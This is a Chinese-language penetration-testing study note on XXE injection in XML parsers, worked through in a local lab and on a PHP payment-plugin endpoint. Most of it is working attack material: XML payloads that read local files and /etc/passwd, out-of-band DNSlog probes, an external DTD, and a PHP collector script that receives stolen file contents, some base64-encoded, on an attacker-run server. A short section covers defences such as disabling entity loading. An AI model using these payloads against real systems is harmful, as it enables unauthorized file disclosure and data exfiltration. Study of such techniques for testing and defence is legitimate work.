### XML&XXE实体注入

#### 原理

```
XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。等同于JSON传输。XXE漏洞XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网扫描、攻击内网等危害。
```

#### XML 与 HTML 的主要差异

```
XML 被设计为传输和存储数据，其焦点是数据的内容。
HTML 被设计用来显示数据，其焦点是数据的外观。
HTML 旨在显示信息 ，而XML旨在传输存储信息。
Example：网站的xml文件解析
```

#### XXE黑盒发现

- 1、获取得到Content-Type或数据类型为xml时，尝试xml语言payload进行测试
- 2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe
- 3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行

#### XXE白盒发现

- 1、可通过应用功能追踪代码定位审计
- 2、可通过脚本特定函数搜索定位审计
- 3、可通过伪协议玩法绕过相关修复等

#### XXE修复防御方案：



##### 方案1-禁用外部实体

```
PHP:
libxml_disable_entity_loader(true);
JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);
Python：
from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

##### 方案2-过滤用户提交的XML数据

```
过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC
```

#### 案例

抓取登录框数据包

![image-20240512111755122](D:\Infiltration\笔记\note\图片\image-20240512111755122-1715505368532-1.png)

xml数据包可以看Content-Type,和数据包格式，

一般的数据包格式为：user=admin&pass=123

json格式的为：message{    "user":100,  

 						 "passwd":20 }

![image-20240512111856987](D:\Infiltration\笔记\note\图片\image-20240512111856987.png)

##### 回显

###### 直接构造

构造恶意xml数据包读取d盘下123.txt

```
<?xml version="1.0"?>
<!DOCTYPE Mikasa [
<!ENTITY test SYSTEM  "file:///d:/123.txt">
]>
<user><username>&test;</username><password>Mikasa</password></user>
```

成功读取到d盘下123.txt

![image-20240512113002452](D:\Infiltration\笔记\note\图片\image-20240512113002452.png)

###### 外部引用实体dtd

创建一个123.dtd文件到到服务器，因为靶场就在本机，我就直接在本地创建

读取d盘下123.txt

```
<!ENTITY send SYSTEM "file:///d:/123.txt">
```

![image-20240512131915132](D:\Infiltration\笔记\note\图片\image-20240512131915132.png)

然后使用python开启http服务

![image-20240512132136838](D:\Infiltration\笔记\note\图片\image-20240512132136838.png)



成功执行

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://192.168.100.2:5566/123.dtd">
    %file;
]>
<user><username>&send;</username><password>Mikasa</password></user>
```

![image-20240512135432984](D:\Infiltration\笔记\note\图片\image-20240512135432984.png)





##### 无回显

###### 带外测试

我搭建的服务器不知道怎么回事，一直返回500的错误，但是dnslog显示已经访问

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://gtegti.dnslog.cn">
    %file;
]>
<user><username>&send;</username><password>xiaodi</password></user>
```



![image-20240512130922957](D:\Infiltration\笔记\note\图片\image-20240512130922957.png)

dnslog访问成功

![image-20240512130847595](D:\Infiltration\笔记\note\图片\image-20240512130847595.png)

###### 无回显读文件



将get.php放入到服务器，

```
<?php
$data=$_GET['file']; 
$myfile = fopen("file.txt", "w+");
fwrite($myfile, $data);
fclose($myfile);
?>
```

将test.dtd放入服务器

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://47.94.236.117/get.php?file=%file;'>">
```

开启php服务

```
php -S 0.0.0.0:5566
```

![image-20240512141835809](D:\Infiltration\笔记\note\图片\image-20240512141835809.png)



```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///d:/123.txt">
<!ENTITY % remote SYSTEM "http://x.x.x.x:5566/test.dtd">
%remote;
%all;
]>
<root>&send;</root>
```

![image-20240512142150020](D:\Infiltration\笔记\note\图片\image-20240512142150020.png)服务器生成读取出来的file.txt

![image-20240512142212440](D:\Infiltration\笔记\note\图片\image-20240512142212440.png)

#### 测试案例

![image-20240512144341572](D:\Infiltration\笔记\note\图片\image-20240512144341572.png)

抓包显示的是json的数据包

![image-20240512144423800](D:\Infiltration\笔记\note\图片\image-20240512144423800.png)

将json数据类型改成xml类型

```
<?xml version="1.0"?>
<!DOCTYPE Mikasa [
<!ENTITY test SYSTEM  "file:///etc/passwd">
]>
<user>&test;</user>
```

![image-20240512144921317](D:\Infiltration\笔记\note\图片\image-20240512144921317.png)



#### 白盒审计



##### 搜索simplexml函数

![image-20240512161414260](D:\Infiltration\笔记\note\图片\image-20240512161414260.png)



##### 找到simplexml函数

![image-20240512161924132](D:\Infiltration\笔记\note\图片\image-20240512161924132.png)

pe_getxml方法用到了simplexml，使用CTRL+B快捷键转到pe_getxml方法声明或用例

![image-20240512162127787](D:\Infiltration\笔记\note\图片\image-20240512162127787.png)

转到pe_getxml用例可以看到，wechat_getxml调用了pe_getxml,相当于wechat_getxml调用了simplexml函数。

![image-20240512162643430](D:\Infiltration\笔记\note\图片\image-20240512162643430.png)

使用CTRL+B快捷键转到wechat_getxml方法声明或用例，下面使用xml返回的数据都是固定的，应该是无回显

![image-20240512162919886](D:\Infiltration\笔记\note\图片\image-20240512162919886.png)

复制路径地址访问抓包

```
include/plugin/payment/wechat/notify_url.php
```

![image-20240512163517475](D:\Infiltration\笔记\note\图片\image-20240512163517475.png)

##### 使用带外测试

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://55vl9k.dnslog.cn">
    %file;
]>
```

![image-20240512203333397](D:\Infiltration\笔记\note\图片\image-20240512203333397.png)



![image-20240512203312015](D:\Infiltration\笔记\note\图片\image-20240512203312015.png)



##### 无回显读文件

###### 原格式读取

将get.php放入到服务器，

```
<?php
$data=$_GET['file']; 
$myfile = fopen("file.txt", "w+");
fwrite($myfile, $data);
fclose($myfile);
?>
```

将test.dtd放入服务器

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://x.x.x.x:5566/get.php?file=%file;'>">
```

开启php服务

```
php -S 0.0.0.0:5566
```

![image-20240512141835809](D:\Infiltration\笔记\note\图片\image-20240512141835809.png)

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///d:/123.txt">
<!ENTITY % remote SYSTEM "http://x.x.x.x:5566/test.dtd">
%remote;
%all;
]>
<root>&send;</root>
```

查看生成的file.txt,成功读取到c盘下123.txt



![image-20240512204457614](D:\Infiltration\笔记\note\图片\image-20240512204457614.png)





###### base64读带空格文件

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=c:/123.txt">
<!ENTITY % remote SYSTEM "http://x.x.x.x:5566/test.dtd">
%remote;
%all;
]>
<root>&send;</root>
```

![image-20240512210414375](D:\Infiltration\笔记\note\图片\image-20240512210414375.png)

成功读取并以base64编码格式



![image-20240512210402383](D:\Infiltration\笔记\note\图片\image-20240512210402383.png)

解码还原

![image-20240512210453021](D:\Infiltration\笔记\note\图片\image-20240512210453021.png)



